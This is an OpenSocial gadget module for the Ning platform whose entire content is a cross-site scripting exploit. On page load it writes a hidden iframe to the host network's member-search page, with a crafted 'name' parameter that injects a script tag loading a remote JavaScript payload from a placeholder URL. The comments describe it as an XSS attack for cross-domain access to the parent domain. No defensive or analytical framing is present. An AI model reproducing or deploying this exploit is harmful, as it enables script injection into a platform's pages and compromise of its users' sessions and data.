<?xml version="1.0" encoding="UTF-8"?>
<Module>

	<ModulePrefs title="Ninga // NOT a pirate!">
		<Require feature="ning" />
		<Require feature="opensocial-0.8"/>
	</ModulePrefs>
	
	<Content type="html">
	<![CDATA[
	<script type="text/javascript">
	
	// Initialized!
	function init() 
	{		
		// Javascript payload location to be included below
		var evil_load = 'http://www.example.com/ninga.js';
		
		// Exploits an XSS bug in NING to gain cross domain access to the parent domain
		var evil_html = '<iframe frameborder="0" style="height:0;width:0;" src="http://'
				+ ning.core.getNetworkDomain() // Get the actual parent domain
				+ '/profiles/members/advancedSearch?name=%22%3E%3Cscript%20src='
				+ evil_load + // Javascript payload is injected into the iframe
				'%3E"></iframe>';
		
		// Perform the XSS attack
		document.write(evil_html);
	}
	
	// Initialize application
	gadgets.util.registerOnLoadHandler(function() { init(); });
	</script>
	
	<div id="handler"></div>
	]]>
	</Content>
	
</Module>
